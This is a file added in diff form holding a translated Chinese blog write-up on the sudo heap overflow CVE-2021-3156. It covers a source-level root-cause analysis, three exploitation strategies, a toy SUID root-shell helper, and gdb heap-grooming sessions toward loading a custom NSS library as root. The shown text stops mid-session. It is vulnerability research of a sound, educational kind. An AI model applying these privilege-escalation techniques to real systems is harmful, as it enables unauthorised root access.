@@ -1,0 +1,918 @@
+# SUDO漏洞提权实战（CVE-2021-3156 POC）
+
+阅读量 **225017**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2021-02-22 10:30:55
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p1.ssl.qhimg.com/t019ad26edc8ac47ad2.jpg)
+
+## 引言
+
+​
+最近刷公众号看到了一个sudo的漏洞，看漏洞介绍是个堆缓冲区溢出的漏洞，出于手痒想跟进一下这个漏洞。经过一番折腾，发现这个漏洞还挺典型的，于是总结了一些想法。接下来我会在漏洞分析、提权原理、利用方案、实战分析等方面表达一些自己的观点。
+
+## 漏洞分析
+
+​ 这几天网上对这个漏洞分析已经挺多的了，这里我再简略分析一下，详情可以参考一下 **Qualys** 团队的研究记录。 **Qualys**
+团队统计的漏洞影响范围是1.8.2 – 1.8.31p2 以及 1.9.0 -1.9.5p1，使用默认编译选项发行的版本。可以在
+<https://github.com/sudo-project/sudo.git>
+下载sudo的源代码（我使用的是1_9_5p1版本的源码）。接下来我们一起看一下源码中set_cmnd方法：
+
+    
+    
+    // plugins/sudoers/sudoers.c
+    913 /*
+    914  * Fill in user_cmnd, user_args, user_base and user_stat variables
+    915  * and apply any command-specific defaults entries.
+    916  */
+    917 static int
+    918 set_cmnd(void)
+    919 {
+    ...
+    957         /* Alloc and build up user_args. */
+    958         for (size = 0, av = NewArgv + 1; *av; av++)
+    959         size += strlen(*av) + 1;
+    960         if (size == 0 || (user_args = malloc(size)) == NULL) {
+    961         sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
+    962         debug_return_int(NOT_FOUND_ERROR);
+    963         }
+    964         if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
+    965         /*
+    966          * When running a command via a shell, the sudo front-end
+    967          * escapes potential meta chars.  We unescape non-spaces
+    968          * for sudoers matching and logging purposes.
+    969          */
+    970         for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
+    971             while (*from) {
+    972             if (from[0] == '\\' && !isspace((unsigned char)from[1]))
+    973                 from++;
+    974             *to++ = *from++;
+    975             }
+    976             *to++ = ' ';
+    977         }
+    978         *--to = '\0';
+    979         } else {
+    ···
+    
+
+漏洞发生在如下逻辑中：
+
+  1. 在958~963行会计算输入参数字符串长度，分配对等大小的堆内存。
+  2. 在970~978会把参数逐字节拷贝到已分配好的内存中。
+  3. 在972 判断了 {‘\‘, ‘\0’} 这种情况，作者的本意应该是处理转义字符，结果造成了其他漏洞。
+
+当遇到 -s ‘param\‘’ 这种参数时：
+
+  1. 分配内存长度为: size = strlen(“param\“) 。
+  2. 当970~978判断参数 {‘\‘, ‘\0’} 时执行 from++，参数的结束符 {‘\0’} 被跳过。
+  3. 最终导致参数以后的内存会继续向user_args中拷贝，直到遇到{‘\0’} 才结束。
+  4. linux 命令行程序参数后边的内存空间存放的是当前命令行的环境变量。因而可以继续构造包含{‘\‘, ‘\0’} 的环境变量，实现内存任意溢出。
+
+接下让我们看一下sudo程序的运行内存，验证上诉的第4点。
+
+    
+    
+    # env -i HOME=/root PATH=/usr/bin/ '11=b\' '22=c\' '33=dddddddddddddddddd' gdb --args /tmp/sudo/bin/sudoedit
+    pwndbg> show env
+    HOME=/root
+    PATH=/usr/bin/
+    11=b\
+    22=c\
+    33=ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
+    pwndbg> b sudoers.c:1014    
+    Breakpoint 3 at 0x7fa8a7fcf19d: sudoers.c:1014. (2 locations)
+    pwndbg> r -s 'aaaaaaaaaaaaaaaaaaaaaaaaa\'
+    ...
+    pwndbg> p sudo_user.cmnd_args
+    $1 = 0x555c71019e70 'a' <repeats 25 times>
+    pwndbg> hexdump sudo_user.cmnd_args 128
+    +0000 0x555c71019e70  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
+    +0010 0x555c71019e80  61 61 61 61  61 61 61 61  61 00 31 31  3d 62 00 32  │aaaa│aaaa│a.11│=b.2│
+    +0020 0x555c71019e90  32 3d 63 00  33 33 3d 64  64 64 64 64  64 64 64 64  │2=c.│33=d│dddd│dddd│
+    +0030 0x555c71019ea0  64 64 64 64  64 64 64 64  64 64 64 64  64 64 64 64  │dddd│dddd│dddd│dddd│
+    ...
+    +0060 0x555c71019ed0  64 64 64 64  64 64 64 64  64 64 64 64  64 64 00 65  │dddd│dddd│dddd│dd.e│
+    +0070 0x555c71019ee0  20 6d 6f 64  65 73 2e 0a  23 20 53 65  65 20 74 68  │.mod│es..│#.Se│e.th
+    
+
+我们发现sudo_user.cmnd_args内存以后的内存已经被环境变量覆盖了。
+
+## 提权原理分析
+
+​ 说到sudo类程序的提权原理，我们需要复习一下linux文件权限表，日常开发中我们常用的文件配置权限如下：
+
+    
+    
+    -rw------- (600)    只有拥有者有读写权限。
+    -rw-r--r-- (644)    只有拥有者有读写权限；而属组用户和其他用户只有读权限。
+    -rwx------ (700)    只有拥有者有读、写、执行权限。
+    -rwxr-xr-x (755)    拥有者有读、写、执行权限；而属组用户和其他用户只有读、执行权限。
+    -rwx--x--x (711)    拥有者有读、写、执行权限；而属组用户和其他用户只有执行权限。
+    -rw-rw-rw- (666)    所有用户都有文件读、写权限。
+    -rwxrwxrwx (777)    所有用户都有读、写、执行权限。
+    
+
+我们在分别查看一下普通程序（/usr/bin/ls）和sudo类程序（/usr/bin/sudo）的文件权限配置：
+
+    
+    
+    -> % stat -c '%04a %U %G %n' /usr/bin/ls  
+    0755 root root /usr/bin/ls
+    -> % stat -c '%a %U %G %n' /usr/bin/sudo
+    4755 root root /usr/bin/sudo
+    
+
+sudo程序的不难发现多最高位权限码是4，这个文件权限码涉及的linux文件的SUID、SGID、Sticky权限配置，这三个具体作用如下：
+
+  * SUID: 作用于二进制文件，使用者将继承此程序的所有者权限
+  * SGID: 作用于二进制文件和目录 
+    * 对于二进制文件: 使用者将继承此程序的所属组权限
+    * 对于目录: 此文件夹下所有用户新建文件都自动继承此目录的用户组
+  * Sticky:作用于目录，目录中每个用户仅能删除、移动或改名自己的文件或目录
+
+sudo程序具备SUID权限，同时sudo的所有者是root，因此普通用户执行sudo程序是可以以root身份去执行的，我们可以实现个简版的sudo.min
+程序测试一下:
+
+    
+    
+    -> % cat << EOF | sudo gcc -Wno-implicit-function-declaration -o sudo.min -xc -    int main(int argc, char **argv) {
+        return !setuid(0) && argc > 1 && execvp(argv[1], argv + 1);
+    }
+    EOF
+    -> % sudo chmod 4755 sudo.min
+    -> % stat -c '%04a %U %G %n' sudo.min
+    4755 root root sudo.min
+    -> % ./sudo.min id -u
+    0
+    -> % ./sudo.min sh
+    sh-5.0# id -u
+    0
+    
+
+上诉简版的sudo程序中我们不难发现带有SUID权限的sudo程序具备了所有者（root）的权限。然而真正的sudo程序会在执行输入命令前鉴定执行者的权限，只有通过了，才会继续执行输入的命令。CVE-2021-3156漏洞在发生在方法set_cnmd，此方法是权限鉴定前的逻辑，因此会造成任意用户提全的风险。
+
+## 利用方案
+
+​ 根据前文的漏洞分析我们已经知道，可以通过输入特殊的参数和环境变量，实现任意大小的堆内存溢出， **Qualys**
+团队给出了三种利用这个漏洞的思路，我发现这三种漏洞利用思路属于比较经典的堆溢出利用方案，接下来我会将详细剖析一下这三种利用思路。
+
+###  重写函数指针
+
+​ 函数指针在CPU执行过程中会经历间接寻址、执行的过程，因此替换函数指针的值便可以实现任意代码执行， **Qualys**
+团队通过crash日志分析找到了struct sudo_hook_entry，修改struct
+sudo_hook_entry实例可以实现任意代码执行的目的，接下来我们根据源码探究一下这个方案的可行性。
+
+    
+    
+    // src/hooks.c
+    ...
+     34 /* Singly linked hook list. */
+     35 struct sudo_hook_entry {
+     36     SLIST_ENTRY(sudo_hook_entry) entries;
+     37     union {
+     38     sudo_hook_fn_t generic_fn;
+     39     sudo_hook_fn_setenv_t setenv_fn;
+     40     sudo_hook_fn_unsetenv_t unsetenv_fn;
+     41     sudo_hook_fn_getenv_t getenv_fn;
+     42     sudo_hook_fn_putenv_t putenv_fn;
+     43     } u;
+     44     void *closure;
+     45 };
+     46 SLIST_HEAD(sudo_hook_list, sudo_hook_entry);
+     47 
+     48 /* Each hook type gets own hook list. */
+     49 static struct sudo_hook_list sudo_hook_setenv_list =
+     50     SLIST_HEAD_INITIALIZER(sudo_hook_setenv_list);
+     51 static struct sudo_hook_list sudo_hook_unsetenv_list =
+     52     SLIST_HEAD_INITIALIZER(sudo_hook_unsetenv_list);
+     53 static struct sudo_hook_list sudo_hook_getenv_list =
+     54     SLIST_HEAD_INITIALIZER(sudo_hook_getenv_list);
+     55 static struct sudo_hook_list sudo_hook_putenv_list =
+     56     SLIST_HEAD_INITIALIZER(sudo_hook_putenv_list);
+    ...
+    125 /* Hook registration internals. */
+    126 static int
+    127 register_hook_internal(struct sudo_hook_list *head,
+    128     int (*hook_fn)(), void *closure)
+    129 {
+    130     struct sudo_hook_entry *hook;
+    131     debug_decl(register_hook_internal, SUDO_DEBUG_HOOKS);
+    132 
+    133     if ((hook = calloc(1, sizeof(*hook))) == NULL) {
+    134     sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_LINENO,
+    135         "unable to allocate memory");
+    136     debug_return_int(-1);
+    137     }
+    138     hook->u.generic_fn = hook_fn;
+    139     hook->closure = closure;
+    140     SLIST_INSERT_HEAD(head, hook, entries);
+    141 
+    142     debug_return_int(0);
+    143 }
+    ...
+    
+
+​ 分析struct sudo_hook_entry
+的定义中我们不难发现，sudo_hook_entry中包含一个函数指针，而且这个指针还是一个union类型的指针。（猜测作者应该是想作为智能指针使用，智能指针详情，请了解
+c++
+的auto指针）。因为这个漏洞是堆溢出类型的漏洞，如果想通过溢出直接修改sudo_hook_entry的实例，sudo_hook_entry的实例最好是在堆空间的实例（由malloc、calloc、……申请的内存是堆空间，如果是静态区就比较麻烦了）。分析register_hook_internal函数的133行我们不难发现，sudo_hook_entry的实例是由calloc申请的内存。因此只要sudo_hook_entry实例的函数指针在sudo程序中有被执行，修改sudo_hook_entry实例的函数指针的确能够实现任意任意代码执行的目的。
+
+​ 上述我们分析论证了重写sudo_hook_entry实例的理论可行性，不过想要真正的实现任意代码执行，对于这个程序还要满足其他条件，我总结为以下几点：
+
+  * 能够加载自定义的代码，修改实例函数指针，让其执行自定义代码。
+  * 能够执行自定义代码，修改实力函数指针为execv、dlopen等加载额外代码的接口地址，再配合有效的参数，实现执行自定义代码模块。
+
+​ **Qualys** 团队通过构造参数满足第二个条件来实现任意代码执行的。让我们继续分析源码，探求一下其中原理。
+
+    
+    
+    // src/hooks.c 
+    ...
+     90 /* NOTE: must not anything that might call getenv() */
+     91 int
+     92 process_hooks_getenv(const char *name, char **value)
+     93 {
+     94     struct sudo_hook_entry *hook;
+     95     char *val = NULL;
+     96     int rc = SUDO_HOOK_RET_NEXT;
+     97 
+     98     /* First process the hooks. */
+     99     SLIST_FOREACH(hook, &sudo_hook_getenv_list, entries) {
+    100     rc = hook->u.getenv_fn(name, &val, hook->closure);
+    101     if (rc == SUDO_HOOK_RET_STOP || rc == SUDO_HOOK_RET_ERROR)
+    102         break;
+    103     }
+    104     if (val != NULL)
+    105     *value = val;
+    106     return rc;
+    107 }
+    ...
+    
+
+​
+在process_hooks_getenv函数的第100行执行了函数指针，该函数的第一个参数是一个字符串，如果用execv的函数地址重写getenv_fn的地址，第100行将执行execv(name,
+&val, hook->closure)，只要运行sudo程序的当前路径下存在一个与同name同名的可执行程序，便可以实现任意代码执行。
+
+​
+当前主流的操作系统大多数开启了alsr机制，因此execv的函数地址、以及process_hooks_getenv实例地址，在每次运行sudo时都是不同，而且在健全的操作系统里，用户只允许查看自己的crash日志。，因此通过对抗alsr来修改函数指针在实战中还是比较困难的。个人觉得实现这个利用方案还要是掺杂一些运气进去的。
+
+###  重写模块加载接口参数
+
+​ 通过修改加载模块接口函数（dlopen、execv、……）的参数也是一个引入自定义代码有效方法。 **Qualys**
+团队通过crash日志分析找到struct service_user可以实现任意代码执行的目的，接下来我们根据源码和函数运行内存探究一下这个方案的可行性。
+
+    
+    
+    pwndbg> b set_cmnd        
+    Breakpoint 1 at 0x7f40003ebfd0: file ./sudoers.c, line 922.
+    pwndbg> r -s xxxxxx\\ xxxxxxxxxxxxx         
+    Starting program: /tmp/sudo/bin/sudoedit -s xxxxxx\\ xxxxxxxxxxxxx
+    [Thread debugging using libthread_db enabled]
+    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+    Breakpoint 1, set_cmnd () at ./sudoers.c:922
+    ...
+    pwndbg> b nss_load_library 
+    Breakpoint 2 at 0x7fc7b9b8d4c0: file nsswitch.c, line 329.
+    pwndbg> c                                                                                                   
+    Continuing.
+    Breakpoint 2, nss_load_library (ni=ni@entry=0x561ae1533cc0) at nsswitch.c:329
+    pwndbg> p ni                                                   
+    $1 = (service_user *) 0x56536ec44cc0
+    pwndbg> p *ni                                                       
+    $2 = {
+      next = 0x56536ec44d00,
+      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN},
+      library = 0x0,
+      known = 0x56536ec50c60,
+      name = 0x56536ec44cf0 "files"
+    }
+    pwndbg> p sudo_user.cmnd_args
+    $3 = 0x56536ed07a0 "xxxxxx"
+    pwndbg> heapbase                                                 
+    heapbase : 0x56536ec4400
+    pwndbg> p (void*) 0x56536ed07a0 - 0x56536ec44cc0                                                             
+    $4 = (void *) 0xffffaf11c828bae0
+    
+
+​ 在上述调试窗口中，我的测试方法可以概括为以下几步：
+
+  * 设置可以让set_cmnd堆溢出的参数：”-s xxxxxx\ xxxxxxxxxxxxx”
+  * 判断set_cmnd堆溢出后内否执行到nss_load_library
+  * 查看ni的地址是否属于堆空间（通过heapbase我们可以判断ni的地址属于堆空间）
+  * 计算sudo_user.cmnd_args 和ni的地址偏移量（0xffffaf11c828bae0）
+  * 判断ni与ni->name 是否属于同一片内存（这点也是比较关键的，后文我会结合源码会详细解释原因）
+
+经过上诉操作可以得出以下几条结论：
+
+  * set_cmnd溢出后仍然能够执行到nss_load_library，也就是说set_cmnd和nss_load_library之间的代码段没有受到坏内存影响。
+  * ni内存是在sudo_user.cmnd_args之前申请的，因为二者偏移量为负数。（heap分配内存是由低址 -> 高地址方向分配，重新运行调试窗口便可以发现nss_load_library在set_cmnd前执行过）
+
+接下来我们接续分析一下nss_load_library的源码实现：
+
+    
+    
+    // glibc-2.31 我的操作系统的libc版本是 GLIBC 2.31-0
+    // 通过执行/usr/lib/x86_64-linux-gnu/libc.so.6 查看自己操作系统的libc版本
+    
+    // nss/nsswitch.h
+    ...
+     61 typedef struct service_user
+     62 {
+     63   /* And the link to the next entry.  */
+     64   struct service_user *next;
+     65   /* Action according to result.  */
+     66   lookup_actions actions[5];
+     67   /* Link to the underlying library object.  */
+     68   service_library *library;
+     69   /* Collection of known functions.  */
+     70   void *known;
+     71   /* Name of the service (`files', `dns', `nis', ...).  */
+     72   char name[0];
+     73 } service_user;
+    ...
+    
+    //nss/nsswitch.c
+    ...
+    318 /* Load library.  */
+    319 static int
+    320 nss_load_library (service_user *ni)
+    321 {
+    322   if (ni->library == NULL)
+    323     {
+    324       /* This service has not yet been used.  Fetch the service
+    325      library for it, creating a new one if need be.  If there
+    326      is no service table from the file, this static variable
+    327      holds the head of the service_library list made from the
+    328      default configuration.  */
+    329       static name_database default_table;
+    330       ni->library = nss_new_service (service_table ?: &default_table,
+    331                      ni->name);
+    332       if (ni->library == NULL)
+    333     return -1;
+    334     }
+    335 
+    336   if (ni->library->lib_handle == NULL)
+    337     {
+    338       /* Load the shared library.  */
+    339       size_t shlen = (7 + strlen (ni->name) + 3
+    340               + strlen (__nss_shlib_revision) + 1);
+    341       int saved_errno = errno;
+    342       char shlib_name[shlen];
+    343 
+    344       /* Construct shared object name.  */
+    345       __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,
+    346                           "libnss_"),
+    347                     ni->name),
+    348               ".so"),
+    349         __nss_shlib_revision);
+    350 
+    351       ni->library->lib_handle = __libc_dlopen (shlib_name);
+    352       if (ni->library->lib_handle == NULL)
+    ...
+    
+
+​ 通过观察nss _load_library的实现，我们不难发现当ni- >library ==
+NULL时，会触发第351行的dlopen加载一个以”libnss_“开头，”.so.2”结尾的动态库。动态库的完整值取决于ni->name的值。因此我们只要通过堆溢出修改ni->library为NULL，ni->name为遵循nss命名规范的自定义动态库既可以加载自定义的代码了。
+
+​
+由上文分析证明只需要修改ni->library和ni->name两处值便可以实现利用漏洞的目的。对于一次性漏洞（一个生命周期中只允许触发一次的漏洞）同时修改两处不同的内存难度是很大的。不过在上文的运行内存分析中我们已经发现ni和ni->name
+属于同一片内存。为了证明这两个地址在同一片内存不是偶然的，我们还要继续分一下struct service_user 的结构。
+
+​ nss/nsswitch.h的第 61 – 73行定义了 struct service_user的结构， 第72行的 char
+name[0];（柔性数组）决定了ni和ni->name指向的地址是一段连续内存。（这种写法在高性能编程里经常会用到，因为这样会减少一次malloc/free，这里不做过多的讨论，以后有机会可以详细分析一下。）
+
+​ 在上文的运行内存分析时，我提到过：”sudouser.cmnd_args
+和ni的地址偏移量是负数“。堆内存是由低地址向高地址分配的，溢出是低地址向高地址溢出的。只有sudo_user.cmnd_args的地址在ni地址之前才能实现修改ni内容。这里我们还要了解一下malloc的缓存机制，为了提高分配内存的速度，以及减少内存碎片。高版本libc中引入了fastbins、largetbins、smallbins、tcachebins等缓存机制。（当前主流操作系统的libc版本都支持这些缓存机制）。因为sudo_user.cmnd_args地址空间长度受我们自己控制，我们只要在ni分配之前申请一块特殊长度的内存，保证在ni之前分配，在set_cmnd前释放且没被其他逻辑再申请走。基于Qualys团队的分析思路，我们可以通过setlocale的方法通过控制LC*的环境变量构造好这个特殊长度的内存碎片。构造内存碎片的过程我会在后文的实战中做进一步演示，这里不做再多的分析。
+
+​
+个人经验来看这个利用方案要比对抗alsr的方案实战性高一些，因为它对操作系统没有任何额外要求，构造随机内存碎片的运气成分也可以通过研究内存分配逻辑来解决。
+
+###  篡改权限鉴定配置
+
+​
+这种这利用方式属于sudo程序特有逻辑，sudo程序在权限鉴定时首先会查找session，判断session中的权限鉴定是否有效。（一般操作系统sudo的session都会持续一段时间，在这个时间内，再次调用sudo不用输入密码。这种session机制本身就存在缺陷，在某些情况下是可以利用的，不过这里没有用到）
+。这个session检查接口（timestamp_lock）有一个小漏洞：timestamp_lock在寻找入口结构（struct
+timestamp_entry）时，没有做tlv结构的完整性校验，造成错误的timestamp_entry结构会被写回到session文件中。接下来我们根据源码再研究一下：
+
+    
+    
+    // plugins/sudoers/def_data.h
+    ...
+     95 #define I_TIMESTAMPDIR          46
+     96 #define def_timestampdir        (sudo_defs_table[I_TIMESTAMPDIR].sd_un.str) //"/run/sudo/ts"
+     97 #define I_TIMESTAMPOWNER        47
+    ...
+    
+    // plugins/sudoers/defaults.c
+     ...
+     583     goto oom;
+     584     if ((def_timestampdir = strdup(_PATH_SUDO_TIMEDIR)) == NULL)
+     585     goto oom;
+     ...    
+    
+    // plugins/sudoers/check.h
+    ...
+     65 struct timestamp_entry {
+     66     unsigned short version; /* version number */
+     67     unsigned short size;    /* entry size */
+     68     unsigned short type;    /* TS_GLOBAL, TS_TTY, TS_PPID */
+     69     unsigned short flags;   /* TS_DISABLED, TS_ANYUID */
+     70     uid_t auth_uid;     /* uid to authenticate as */
+     71     pid_t sid;          /* session ID associated with tty/ppid */
+     72     struct timespec start_time; /* session/ppid start time */
+     73     struct timespec ts;     /* time stamp (CLOCK_MONOTONIC) */
+     74     union {
+     75     dev_t ttydev;       /* tty device number */
+     76     pid_t ppid;     /* parent pid */
+     77     } u;
+     78 };
+     ...
+    
+     // plugins/sudoers/timestamp.c
+     ...
+     298 static ssize_t
+     299 ts_write(int fd, const char *fname, struct timestamp_entry *entry, off_t offset)
+     300 {
+     ...
+     305     if (offset == -1) {
+     306     old_eof = lseek(fd, 0, SEEK_CUR);
+     307     nwritten = write(fd, entry, entry->size);
+     308     } else {
+     ...
+     398 /*
+     399  * Open the user's time stamp file.
+     400  * Returns a cookie or NULL on error, does not lock the file.
+     401  */
+     402 void *
+     403 timestamp_open(const char *user, pid_t sid)
+     404 {
+     ...
+     420     /* Open time stamp file. */
+     421     if (asprintf(&fname, "%s/%s", def_timestampdir, user) == -1) {
+     422     sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
+     ...
+     608 /*
+     609  * Lock a record in the time stamp file for exclusive access.
+     610  * If the record does not exist, it is created (as disabled).
+     611  */
+     612 bool
+     613 timestamp_lock(void *vcookie, struct passwd *pw)
+     614 {
+     ...
+     638     nread = read(cookie->fd, &entry, sizeof(entry));
+     639     if (nread < ssizeof(struct timestamp_entry_v1)) {
+     640     /* New or invalid time stamp file. */
+     641     overwrite = true;
+     642     } else if (entry.type != TS_LOCKEXCL) {
+     ...
+     648         if (ts_write(cookie->fd, cookie->fname, &entry, 0) == -1)
+     649         debug_return_bool(false);
+     650     } else {
+     ...
+    
+
+在plugins/sudoers/timestamp.c 的421行我们不难发现，sudo默认session路径是“/run/sudo/ts” +
+当前用户名，def_timestampdir的地址是一个堆地址（plugins/sudoers/defaults.c的584行不难发现，使用strdup初始化的def_timestampdir）。因此我们可以总结一下这个方案的利用思路：
+
+  * 构造溢出内存重写def_timestampdir的值，修改成一个普通用户可写的目录，暂记为NDIR。
+  * 启动其他进程在NDIR中创建一个名称为当前用户指向 /etc/passwd的软链接
+  * 在同一块溢出内存中构造uid是0的当前用户配置（例如：test: x:0:0::/home/test:/usr/bin/sh）
+  * 利用timestamp_lock的回写逻辑把新的配置写入到NDIR/test -> /etc/passwd，最终实现test的uid == 0
+
+​ 这个漏洞利用方案有点像前几年的内核“脏牛”漏洞，都是通过越权修改文件，最终实现提权效果。根据 **Qualys**
+团队的研究表明，timestamp_lock的小漏洞已经在2020.01的586b418a修复了，目前还没有backport到老的版本中。
+
+## POC实战
+
+​ 上诉的三类方案中我个人更喜欢第二个方案，有以下几个原因：
+
+  * 不需要与alsr对抗，有些操作系统不允许读取crash日志，获取alsr基地址比较困难。
+  * 个人更喜欢缓存攻击的攻击方案（以前工作中写过一些内核POC，经常会利用slab/slub机制。缓存设计的本意是提升效率的，结果引发了新的安全问题，感兴趣的同学可以详细学习一下。）
+  * 第三个方案依赖其他漏洞，前提条件太多，针对性太强。
+
+综上几个原因，让我们开始第二个方案的实战吧。
+
+我们已经知道sudo的运行内存会受到LC_*的环境变量影响我们先清空一下环境变量看一下sudo的运行内存情况：
+
+    
+    
+    # env -i HOME=/root PATH=/usr/bin/ gdb --args /tmp/sudo/bin/sudoedit -A -s xxxxxx\\ xxxxxxxxxxxxx
+    
+
+set_cmnd执行前的内存情况：
+
+    
+    
+    pwndbg> heapbase
+    heapbase : 0x55790ab92000
+    pwndbg> heapinfo
+                      top: 0x55790aba6a50 (size : 0xc5b0) 
+           last_remainder: 0x55790ab9eba0 (size : 0xf00) 
+                unsortbin: 0x55790ab9eba0 (size : 0xf00)
+             largebin[48]: 0x55790aba3bd0 (size : 0x2d20)
+             largebin[50]: 0x55790ab9faf0 (size : 0x4010)
+    (0x20)   tcache_entry[0](1): 0x55790ab9e390
+    (0x40)   tcache_entry[2](3): 0x55790ab941d0 --> 0x55790ab96c30 --> 0x55790ab96920
+    (0x70)   tcache_entry[5](1): 0x55790ab93480
+    (0x80)   tcache_entry[6](1): 0x55790aba3b60
+    (0x100)   tcache_entry[14](1): 0x55790ab97f10
+    (0x150)   tcache_entry[19](1): 0x55790ab96ae0
+    (0x180)   tcache_entry[22](1): 0x55790ab96960
+    (0x1e0)   tcache_entry[28](1): 0x55790ab9e8c0
+    
+
+set_cmnd执行后nss_load_library初始化__nss_group_database前的的内存情况：
+
+    
+    
+    pwndbg> heapinfo
+                      top: 0x55790aba6a50 (size : 0xc5b0) 
+           last_remainder: 0x55790ab9ec40 (size : 0xe60) 
+                unsortbin: 0x55790ab9ec40 (size : 0xe60)
+             largebin[48]: 0x55790aba3bd0 (size : 0x2d20)
+             largebin[50]: 0x55790ab9faf0 (size : 0x4010)
+    (0x40)   tcache_entry[2](3): 0x55790ab941d0 --> 0x55790ab96c30 --> 0x55790ab96920
+    (0x70)   tcache_entry[5](1): 0x55790ab93480
+    (0x80)   tcache_entry[6](1): 0x55790aba3b60
+    (0x100)   tcache_entry[14](1): 0x55790ab97f10
+    (0x150)   tcache_entry[19](1): 0x55790ab96ae0
+    (0x180)   tcache_entry[22](1): 0x55790ab96960
+    (0x1e0)   tcache_entry[28](1): 0x55790ab9e8c0
+    
+
+nss_load_library初始化__nss_group_database和sudo_user.cmnd_args后的内存i情况：
+
+    
+    
+    pwndbg> heapinfo
+                      top: 0x55790aba6a50 (size : 0xc5b0) 
+           last_remainder: 0x55790ab9ec80 (size : 0xe20) 
+                unsortbin: 0x55790ab9ec80 (size : 0xe20)
+             largebin[48]: 0x55790aba3bd0 (size : 0x2d20)
+             largebin[50]: 0x55790ab9faf0 (size : 0x4010)
+    (0x40)   tcache_entry[2](3): 0x55790ab941d0 --> 0x55790ab96c30 --> 0x55790ab96920
+    (0x70)   tcache_entry[5](1): 0x55790ab93480
+    (0x80)   tcache_entry[6](1): 0x55790aba3b60
+    (0x100)   tcache_entry[14](1): 0x55790ab97f10
+    (0x150)   tcache_entry[19](1): 0x55790ab96ae0
+    (0x180)   tcache_entry[22](1): 0x55790ab96960
+    (0x1e0)   tcache_entry[28](1): 0x55790ab9e8c0
+    pwndbg> p __nss_group_database                                                                               $5 = (service_user *) 0x55790ab92cc0
+    pwndbg> p sudo_user.cmnd_args                                                                                 $6 = 0x55790ab9e390 "xxxxxx"
+    pwndbg> chunkptr __nss_group_database                                                                         ==================================
+                Chunk info            
+    ==================================
+    Status :  Used 
+    Freeable : True
+    prev_size : 0x70756f7267                  
+    size : 0x40                  
+    prev_inused : 1                    
+    is_mmap : 0                    
+    non_mainarea : 0 
+    pwndbg> chunkptr sudo_user.cmnd_args                                                                         ==================================
+                Chunk info            
+    ==================================
+    Status :  Freed 
+    Unlinkable : False (FD or BK is corruption)  
+    Can't access memory
+    prev_size : 0x0                  
+    size : 0x20                  
+    prev_inused : 1                    
+    is_mmap : 0                    
+    non_mainarea : 0                     
+    fd : 0x7800787878787878                  
+    bk : 0x7878787878787878
+    
+
+上述的内存情况我们可以得到以下结论：
+
+  * sudo_user.cmnd_args的地址高于__nss_group_database的地址
+  * tcache中也没有低于__nss_group_database的地址
+  * __nss_group_database节点的大小是0x40。
+  * sudo_user.cmnd_args节点的大小是0x20 。（因为已经溢出下一个chunk已经被破坏）
+
+接下来我们构造一些内存碎片，给让他们的地址小于__nss_group_database
+
+    
+    
+    pwndbg> set env LC_IDENTIFICATION=en_US.UTF-8@xxxxxxxxxxxxx
+    pwndbg> heapbase
+    heapbase : 0x56447517a000
+    pwndbg> heapinfo
+                      top: 0x564475190500 (size : 0xab00) 
+           last_remainder: 0x564475188730 (size : 0xe20) 
+                unsortbin: 0x564475188730 (size : 0xe20)
+             largebin[48]: 0x56447518d680 (size : 0x2d20)
+             largebin[50]: 0x5644751895a0 (size : 0x4010)
+    (0x40)   tcache_entry[2](3): 0x56447517d7e0 --> 0x56447517d770 --> 0x56447517d460
+    (0x70)   tcache_entry[5](1): 0x56447517cf80
+    (0x80)   tcache_entry[6](1): 0x56447518d610
+    (0x100)   tcache_entry[14](1): 0x5644751819c0
+    (0x150)   tcache_entry[19](1): 0x56447517d620
+    (0x180)   tcache_entry[22](1): 0x56447517d4a0
+    (0x1e0)   tcache_entry[28](1): 0x564475188370
+    pwndbg> p __nss_group_database                                                                               $1 = (service_user *) 0x56447517d8c0
+    pwndbg> p sudo_user.cmnd_args                                                                                 $2 = 0x564475187e40 "xxxxxx"
+    pwndbg> p (void*)__nss_group_database - 0x56447517d7e0                                                       $2 = (void *) 0xe0
+    
+
+此时我们发现，tcache_entry[2]、tcache_entry[19]、
+tcache_entry[22]的内存碎片地址都小于__nss_passwd_database的地址。接下来我们调整输入参数，申请到这个碎片。
+
+    
+    
+    pwndbg> b set_cmnd 
+    Breakpoint 1 at 0x7f36d5c62fd0: file ./sudoers.c, line 922.
+    pwndbg> r -s 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\'
+    ...
+    pwndbg> heapbase                                                                                             heapbase : 0x555f813c5000
+    pwndbg> heapinfo
+                      top: 0x555f813db500 (size : 0xab00) 
+           last_remainder: 0x555f813d3650 (size : 0xf00) 
+                unsortbin: 0x555f813d3650 (size : 0xf00)
+             largebin[48]: 0x555f813d8680 (size : 0x2d20)
+             largebin[50]: 0x555f813d45a0 (size : 0x4010)
+    (0x20)   tcache_entry[0](1): 0x555f813d2e40
+    (0x40)   tcache_entry[2](3): 0x555f813c87d0 --> 0x555f813c8770 --> 0x555f813c8460
+    (0x70)   tcache_entry[5](1): 0x555f813c7f80
+    (0x80)   tcache_entry[6](1): 0x555f813d8610
+    (0x100)   tcache_entry[14](1): 0x555f813cc9c0
+    (0x150)   tcache_entry[19](1): 0x555f813c8620
+    (0x180)   tcache_entry[22](1): 0x555f813c84a0
+    (0x1e0)   tcache_entry[28](1): 0x555f813d3370
+    pwndbg> b ./sudoers.c:1014                                                                                   Breakpoint 2 at 0x7f053126319d: ./sudoers.c:1014. (2 locations)
+    pwndbg> c
+    ...
+    pwndbg> heapinfo                                                      
+                      top: 0x555f813db500 (size : 0xab00) 
+           last_remainder: 0x555f813d36f0 (size : 0xe60) 
